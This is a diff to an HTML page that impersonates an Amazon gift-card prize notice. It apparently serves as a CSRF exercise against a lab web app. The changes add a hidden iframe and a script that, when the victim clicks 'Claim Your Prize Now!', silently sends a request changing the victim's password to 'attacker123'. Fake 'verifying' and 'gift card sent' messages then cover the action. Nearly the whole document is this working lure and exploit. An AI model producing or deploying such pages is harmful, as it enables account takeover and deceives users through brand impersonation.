@@ -3,7 +3,7 @@
 <head>
   <title>Amazon - You Won!</title>
   <style>
-    body { font-family: Arial; background: #f0f0f0; }
+    body { font-family: Arial; background: #f0f0f0; margin: 0; }
     .header { background: #232f3e; color: white; 
               padding: 15px; font-size: 24px; }
     .logo { color: #ff9900; font-weight: bold; }
@@ -17,6 +17,15 @@
            padding: 15px 40px; border: none; 
            font-size: 18px; border-radius: 5px; 
            cursor: pointer; }
+    .btn:hover { background: #e47911; }
+
+    /* Hidden iframe - victim never sees this */
+    #silentFrame {
+      display: none;
+      width: 0;
+      height: 0;
+      border: none;
+    }
   </style>
 </head>
 <body>
@@ -27,35 +36,51 @@
 
 <div class="container">
   <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" 
-       width="150" />
-  <div class="prize-box">
+       width="150" /><br><br>
+
+  <div class="prize-box" id="prizeMsg">
     🎉 Congratulations! You won ₹10,000 Amazon Gift Card!
   </div>
+
   <p>Dear Valued Customer,</p>
   <p>Your account has been selected for our annual lucky draw!</p>
   <p>Click below to claim your reward immediately.</p>
 
-  <!-- Button triggers CSRF via top-level navigation -->
-  <!-- SameSite=Lax allows cookies on top level GET! -->
-  <button class="btn" onclick="attack()">
+  <button class="btn" id="claimBtn" onclick="attack()">
     Claim Your Prize Now!
   </button>
 
-  <p><small>Offer valid for 24 hours only.</small></p>
+  <p><small>Offer valid for 24 hours only. 
+  Terms and conditions apply.</small></p>
 </div>
+
+<!-- Hidden iframe loads CSRF URL silently -->
+<!-- Victim never sees this! -->
+<iframe id="silentFrame" src=""></iframe>
 
 <script>
 function attack() {
-  // Step 1: Show fake loading to distract victim
-  document.querySelector('.prize-box').innerHTML = 
-    '⏳ Processing your reward... Please wait!';
-  
-  // Step 2: Redirect victim browser to CSRF URL
-  // This is TOP LEVEL navigation = SameSite=Lax allows cookies!
+
+  // Step 1: Disable button so victim doesn't click twice
+  document.getElementById('claimBtn').disabled = true;
+  document.getElementById('claimBtn').innerText = 'Processing...';
+
+  // Step 2: Show fake success message to victim
+  document.getElementById('prizeMsg').innerHTML = 
+    '⏳ Verifying your account...';
+
+  // Step 3: Fire CSRF silently in hidden iframe
+  // Victim stays on THIS page and sees nothing!
+  document.getElementById('silentFrame').src = 
+    'http://192.168.133.100/csrf_1.php?password_new=attacker123&password_conf=attacker123&action=change';
+
+  // Step 4: After 3 seconds show fake congratulations
   setTimeout(function() {
-    window.location.href = 
-      'http://192.168.133.100/csrf_1.php?password_new=attacker123&password_conf=attacker123&action=change';
-  }, 2000);
+    document.getElementById('prizeMsg').innerHTML = 
+      '✅ ₹10,000 Gift Card sent to your registered email!';
+    document.getElementById('claimBtn').innerText = 
+      'Claimed Successfully!';
+  }, 3000);
 }
 </script>
 
